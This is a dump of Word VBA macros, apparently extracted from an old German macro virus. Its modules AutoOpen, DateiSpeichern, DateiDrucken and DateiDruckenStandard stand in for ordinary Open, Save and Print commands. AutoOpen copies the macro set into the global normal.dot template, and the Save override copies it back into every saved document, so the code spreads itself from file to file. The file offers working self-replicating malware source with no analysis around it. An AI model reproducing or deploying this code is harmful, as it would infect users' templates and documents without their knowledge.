   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "DateiDruckenStandard"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Druckt das aktive Dokument mit den aktuellen Standardeinstellungen."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.DateiDruckenStandard.MAIN"
    WordBasic.FilePrint
   End Sub

   Attribute VB_Name = "DateiSpeichern"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Speichert die aktuelle Datei oder Dokumentvorlage."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.DateiSpeichern.MAIN"
   Dim Z$
   Dim Q$
    WordBasic.FileSaveAs Format:=1
    If WordBasic.CountMacros(1) = 0 Then
    Z$ = WordBasic.[FileName$]():
    Q$ = WordBasic.[DefaultDir$](2) + "\normal.dot":
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="AutoOpen", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="DateiDrucken", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="DateiDruckenStandard", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="DateiSpeichern", Tab:=3:
    WordBasic.FileSaveAll 1, 1
   End If
   End Sub


   Attribute VB_Name = "DateiDrucken"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Druckt das aktive Dokument."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.DateiDrucken.MAIN"
    WordBasic.FilePrint
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim Q$
   Dim Z$
    If WordBasic.CountMacros(1) <> 0 Then
    Q$ = WordBasic.[FileName$]():
    Z$ = WordBasic.[DefaultDir$](2) + "\normal.dot":
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="AutoOpen", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="DateiDrucken", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="DateiDruckenStandard", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="DateiSpeichern", Tab:=3
    Else
    WordBasic.FileSaveAs Format:=1:
    If WordBasic.CountMacros(1) = 0 Then
    Z$ = WordBasic.[FileName$]():
    Q$ = WordBasic.[DefaultDir$](2) + "\normal.dot":
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="AutoOpen", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="DateiDrucken", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="DateiDruckenStandard", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="DateiSpeichern", Tab:=3
    End If
    End If
    WordBasic.FileSaveAll 1, 1
   End Sub
